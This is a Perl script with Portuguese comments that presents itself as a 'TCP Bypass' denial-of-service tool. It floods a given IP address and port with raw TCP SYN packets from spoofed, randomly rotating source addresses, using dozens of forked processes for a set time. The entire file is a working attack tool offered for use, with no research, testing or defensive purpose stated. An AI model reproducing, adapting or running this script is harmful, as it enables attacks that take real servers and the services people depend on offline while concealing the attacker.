#!/usr/bin/perl
#####################################################
# TCP Bypass DDoS Script - Modificado por Colin
# Baseado no script UDP original, adaptado para TCP SYN flood com técnicas de bypass
######################################################

use Socket;
use strict;
use Getopt::Long;
use Time::HiRes qw( usleep gettimeofday );
use Net::RawIP;

our $port = 0;
our $size = 0;
our $time = 0;
our $bw   = 0;
our $help = 0;
our $delay= 0;
our $threads = 50;

GetOptions(
    "port=i" => \$port,        # TCP port to target
    "size=i" => \$size,        # packet size
    "bandwidth=i" => \$bw,     # bandwidth to consume
    "time=i" => \$time,        # time to run
    "delay=f"=> \$delay,       # inter-packet delay
    "threads=i"=>\$threads,    # number of threads
    "help|?" => \$help);

my ($ip) = @ARGV;

if ($help || !$ip) {
  print <<'EOL';
 Uso: perl tcp_bypass.pl <IP-alvo> [--port=80] [--time=60] [--threads=50]
EOL
  exit(1);
}

print "[0;32m>> TCP Bypass Attack - Modificado por Colin (ex-hacker)\n";
print "[0;31m>> Alvo: $ip\n";
print "[0;36m>> Iniciando ataque TCP SYN flood com múltiplas threads...\n";

$SIG{'KILL'} = sub { print "\nParando threads...\n"; exit(1); };

my $endtime = time() + ($time ? $time : 100);
my @threads;

# Função de ataque TCP SYN
sub tcp_flood {
    my ($target_ip, $target_port) = @_;
    my $packet = new Net::RawIP;
    my $source_ip = join('.', map { int(rand(254)) + 1 } (1..4));
    
    while (time() < $endtime) {
        $target_port = $port ? $port : int(rand(65535)) + 1;
        
        # Cria pacote TCP SYN com source IP aleatório
        $packet->set({
            ip => {
                saddr => $source_ip,
                daddr => $target_ip
            },
            tcp => {
                source => int(rand(65535)) + 1024,
                dest   => $target_port,
                syn    => 1,
                window => 5840
            }
        });
        
        $packet->send;
        
        # Gera novo IP de origem periodicamente
        $source_ip = join('.', map { int(rand(254)) + 1 } (1..4)) if rand() < 0.3;
        
        usleep(1000 * $delay) if $delay;
    }
}

# Cria múltiplas threads
for (my $i = 0; $i < $threads; $i++) {
    my $pid = fork();
    if ($pid == 0) {
        # Processo filho
        tcp_flood($ip, $port);
        exit(0);
    } else {
        push @threads, $pid;
    }
}

print "[1;31m>> $threads threads iniciadas. Pressione CTRL+C para parar.\n";

# Espera o tempo especificado
if ($time) {
    sleep($time);
} else {
    while (1) { sleep(1); }
}

# Mata todos os processos filhos
kill('KILL', $_) for @threads;
print "[1;32m>> Ataque finalizado.\n";